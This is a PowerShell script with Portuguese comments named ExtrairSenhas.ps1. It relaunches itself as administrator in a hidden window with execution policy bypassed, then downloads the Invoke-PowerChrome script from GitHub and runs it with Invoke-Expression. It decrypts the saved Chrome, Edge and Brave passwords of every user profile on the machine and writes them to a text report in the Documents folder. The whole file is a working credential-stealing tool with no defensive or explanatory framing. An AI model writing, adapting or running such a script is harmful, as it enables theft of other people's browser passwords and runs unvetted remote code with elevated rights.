# ExtrairSenhas.ps1 - Versão com diagnóstico e varredura completa

# Força a execução como administrador
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
if (-not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
}

$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_completo_$datahora.txt"

# Inicia o relatório
$relatorio = @"
========================================
RELATÓRIO COMPLETO DE SENHAS
Data: $(Get-Date -Format "dd/MM/yyyy HH:mm:ss")
Computador: $env:COMPUTERNAME
========================================

"@

# CARREGA O SCRIPT DO GITHUB (com verificação)
Write-Host "Carregando script do GitHub..." -ForegroundColor Cyan
try {
    $scriptContent = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -ErrorAction Stop
    $relatorio += "[OK] Script do GitHub carregado com sucesso`n"
    Write-Host "Script carregado!" -ForegroundColor Green
} catch {
    $relatorio += "[ERRO] Falha ao carregar script do GitHub: $_`n"
    Write-Host "ERRO ao carregar script!" -ForegroundColor Red
    $relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8
    exit
}

# Executa o script carregado
$null = Invoke-Expression $scriptContent

# Lista de usuários
$usuarios = Get-ChildItem "C:\Users" -Directory | Where-Object { $_.Name -notin @("Public", "Default", "Default User", "All Users") }

if ($usuarios.Count -eq 0) {
    $relatorio += "Nenhum usuario encontrado em C:\Users`n"
} else {
    $relatorio += "Usuarios encontrados: $($usuarios.Name -join ', ')`n"
}

foreach ($usuario in $usuarios) {
    $userName = $usuario.Name
    $userPath = $usuario.FullName
    $appDataLocal = Join-Path $userPath "AppData\Local"
    
    $relatorio += "`n========================================`n"
    $relatorio += "USUÁRIO: $userName`n"
    $relatorio += "========================================`n"
    
    # Chrome
    $chromePath = Join-Path $appDataLocal "Google\Chrome\User Data\Default\Login Data"
    $relatorio += "`n--- Chrome ---`n"
    if (Test-Path $chromePath) {
        $tamanho = [math]::Round((Get-Item $chromePath).Length / 1KB, 2)
        $relatorio += "Arquivo encontrado! Tamanho: $tamanho KB`n"
        
        # Tenta extrair
        try {
            $output = Invoke-PowerChrome -Browser Chrome 2>&1
            if ($output -match "Decrypted Credentials") {
                $relatorio += $output
            } else {
                $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
                $relatorio += "Saida do comando: $output`n"
            }
        } catch {
            $relatorio += "ERRO na execucao: $($_.Exception.Message)`n"
        }
    } else {
        $relatorio += "Chrome nao encontrado ou sem dados em: $chromePath`n"
    }
    
    # Edge
    $edgePath = Join-Path $appDataLocal "Microsoft\Edge\User Data\Default\Login Data"
    $relatorio += "`n--- Edge ---`n"
    if (Test-Path $edgePath) {
        $tamanho = [math]::Round((Get-Item $edgePath).Length / 1KB, 2)
        $relatorio += "Arquivo encontrado! Tamanho: $tamanho KB`n"
        
        try {
            $output = Invoke-PowerChrome -Browser Edge 2>&1
            if ($output -match "Decrypted Credentials") {
                $relatorio += $output
            } else {
                $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
            }
        } catch {
            $relatorio += "ERRO na execucao: $($_.Exception.Message)`n"
        }
    } else {
        $relatorio += "Edge nao encontrado ou sem dados`n"
    }
    
    # Brave
    $bravePath = Join-Path $appDataLocal "BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    $relatorio += "`n--- Brave ---`n"
    if (Test-Path $bravePath) {
        $tamanho = [math]::Round((Get-Item $bravePath).Length / 1KB, 2)
        $relatorio += "Arquivo encontrado! Tamanho: $tamanho KB`n"
        
        try {
            $output = Invoke-PowerChrome -Browser Brave 2>&1
            if ($output -match "Decrypted Credentials") {
                $relatorio += $output
            } else {
                $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
            }
        } catch {
            $relatorio += "ERRO na execucao: $($_.Exception.Message)`n"
        }
    } else {
        $relatorio += "Brave nao encontrado ou sem dados`n"
    }
}

$relatorio += "`n========================================`n"
$relatorio += "FIM DO RELATÓRIO`n"
$relatorio += "========================================`n"

# Salva o relatório
$relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8

# Abre o arquivo para o usuário ver o que aconteceu
Start-Process notepad.exe $arquivoSaida

exit
